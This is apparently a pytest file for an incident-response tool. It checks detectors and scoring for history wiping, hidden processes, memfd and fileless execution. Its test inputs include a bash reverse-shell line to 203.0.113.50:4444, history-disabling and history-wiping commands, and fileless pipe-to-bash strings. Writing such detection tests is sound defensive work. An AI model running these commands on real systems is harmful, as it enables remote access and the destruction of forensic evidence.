"""清痕、隐藏进程、memfd 与无文件执行。

这几类不并进 test_detection_accuracy 的 20 个场景。
失陷阈值仍是 6 分：单独清空历史不算，配上落地或隐藏进程才算。
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

from irtrace.analyzers.correlation import CorrelationAnalyzer
from irtrace.analyzers.intrusion import judge_intrusion
from irtrace.collectors.command_history import (
    CommandHistoryCollector,
    _DISABLE,
    _WIPE,
    _command_lines,
)
from irtrace.collectors.hidden_proc import HiddenProcCollector
from irtrace.collectors.process import _is_fileless, _is_memfd
from irtrace.core.context import RunContext
from irtrace.core.models import Category, Event


def _ev(action: str, *, minutes: int = 0, **kwargs) -> Event:
    base = datetime(2026, 10, 13, 9, 0, tzinfo=timezone.utc)
    kwargs.setdefault("category", Category.PROCESS)
    kwargs.setdefault("source", "bench")
    kwargs.setdefault("message", action)
    return Event(action=action, timestamp=base + timedelta(minutes=minutes), **kwargs)


class _Ctx:
    def __init__(self, events):
        self.events = events


def test_memfd_and_stdin_patterns():
    assert _is_memfd("/memfd:payload (deleted)")
    assert _is_memfd("/proc/self/fd/3")
    assert not _is_memfd("/usr/bin/python3")
    assert _is_fileless("python3 - < /dev/shm/x")
    assert _is_fileless("perl - ")
    assert _is_fileless("cat /tmp/a | bash < /dev/stdin")
    assert not _is_fileless("python3 -c 'print(1)'")
    assert not _is_fileless("python3 -m http.server")
    assert not _is_fileless("/usr/bin/bash /etc/cron.daily/apt")


def test_history_disable_and_wipe_patterns():
    assert _DISABLE.search("export HISTFILE=/dev/null")
    assert _DISABLE.search("HISTSIZE=0")
    assert _DISABLE.search('HISTFILESIZE="0"')
    assert not _DISABLE.search("HISTSIZE=5000")
    assert _WIPE.search("history -c")
    assert _WIPE.search("rm -f ~/.bash_history")
    assert not _WIPE.search("echo kept >> ~/.bash_history")
    assert _command_lines("# comment\n\nls\n: 1700000000:0;ignored\n") == ["ls"]
    assert _command_lines("# only\n\n: 1700000000:0;pwd\n") == []


def test_history_wipe_alone_is_not_compromise():
    verdict = judge_intrusion([
        _ev("history_wiped", category=Category.FILE,
            path="/root/.bash_history", tags=["defense-evasion", "history-wipe"]),
    ])
    assert not verdict.compromised


def test_history_wipe_after_drop_is_compromise():
    verdict = judge_intrusion([
        _ev("suspicious_file", minutes=1, category=Category.FILE,
            path="/tmp/.x", tags=["suspicious-file"]),
        _ev("process_suspicious", minutes=2, path="/tmp/.x",
            tags=["suspicious-process"]),
        _ev("history_wiped", minutes=3, category=Category.FILE,
            path="/root/.bash_history", tags=["defense-evasion", "history-wipe"]),
    ])
    assert verdict.compromised
    assert any("命令历史被清理" in item for item in verdict.signals)


def test_hidden_process_alone_is_compromise():
    verdict = judge_intrusion([
        _ev("hidden_process", pid=4242, tags=["rootkit", "hidden-process"],
            message="PID=4242 在 /proc 中存在但 ps 不可见"),
    ])
    assert verdict.compromised
    assert "T1014" in verdict.mitre


def test_memfd_exec_is_compromise():
    verdict = judge_intrusion([
        _ev("process_suspicious", path="/memfd:payload (deleted)",
            tags=["suspicious-process", "memfd_exec"]),
    ])
    assert verdict.compromised
    assert "T1620" in verdict.mitre


def test_fileless_stdin_is_compromise():
    verdict = judge_intrusion([
        _ev("process_suspicious", path="/usr/bin/python3",
            tags=["suspicious-process", "fileless_exec"],
            message="python3 - "),
    ])
    assert verdict.compromised


def test_existing_reverse_shell_score_unchanged():
    verdict = judge_intrusion([
        _ev("process_suspicious", path="/bin/bash",
            tags=["suspicious-process", "reverse_shell_pattern"],
            message="bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"),
    ])
    assert verdict.score == 5
    assert not verdict.compromised


def test_r12_requires_payload():
    analyzer = CorrelationAnalyzer()
    wipe = _ev("history_wiped", category=Category.FILE, path="/root/.bash_history")
    assert analyzer._r12_history_then_payload(_Ctx([wipe])) == []
    payload = _ev("process_suspicious", path="/tmp/.x",
                  tags=["suspicious-process", "memfd_exec"])
    found = analyzer._r12_history_then_payload(_Ctx([wipe, payload]))
    assert len(found) == 1
    assert "T1070.003" in found[0].mitre


def test_r13_requires_support():
    analyzer = CorrelationAnalyzer()
    hidden = _ev("hidden_process", pid=9, tags=["hidden-process"])
    assert analyzer._r13_hidden_process(_Ctx([hidden])) == []
    deleted = _ev("process_suspicious", tags=["exe_deleted"],
                  path="/usr/bin/sshd (deleted)")
    found = analyzer._r13_hidden_process(_Ctx([hidden, deleted]))
    assert len(found) == 1
    assert found[0].severity.value == "critical"


def test_command_history_collector_flags_disabled_histfile(workspace, tmp_path):
    home = tmp_path / "home" / "bob"
    home.mkdir(parents=True)
    (home / ".bashrc").write_text("export HISTFILE=/dev/null\n", encoding="utf-8")
    (home / ".bash_history").write_text("# empty\n", encoding="utf-8")
    # 历史比启动脚本新，才算被截断。
    import os
    import time
    now = time.time()
    os.utime(home / ".bashrc", (now - 100, now - 100))
    os.utime(home / ".bash_history", (now, now))

    ctx = RunContext(workspace, persistent=False)
    collector = CommandHistoryCollector()
    original = collector._homes
    collector._homes = lambda _ctx: [str(home)]  # type: ignore[method-assign]
    try:
        result = collector.collect(ctx)
    finally:
        collector._homes = original  # type: ignore[method-assign]
    reasons = {event.raw["reason"] for event in result.events}
    assert "histfile_disabled" in reasons
    assert "truncated_after_profile" in reasons
    assert all(event.action == "history_wiped" for event in result.events)


def test_hidden_proc_skips_when_ps_missing(workspace, monkeypatch):
    ctx = RunContext(workspace, persistent=False)
    monkeypatch.setattr(ctx, "which", lambda _cmd: None)
    result = HiddenProcCollector().collect(ctx)
    assert result.events == []
    assert result.stats["skipped"] == "no-ps"


def test_r14_requires_network_or_drop():
    analyzer = CorrelationAnalyzer()
    proc = _ev("process_suspicious", path="/memfd:x", tags=["memfd_exec"])
    assert analyzer._r14_fileless_exec(_Ctx([proc])) == []
    conn = _ev("external_connection", category=Category.NETWORK,
               dst_ip="203.0.113.8", tags=["external-conn", "outbound"])
    found = analyzer._r14_fileless_exec(_Ctx([proc, conn]))
    assert len(found) == 1
    assert "T1620" in found[0].mitre
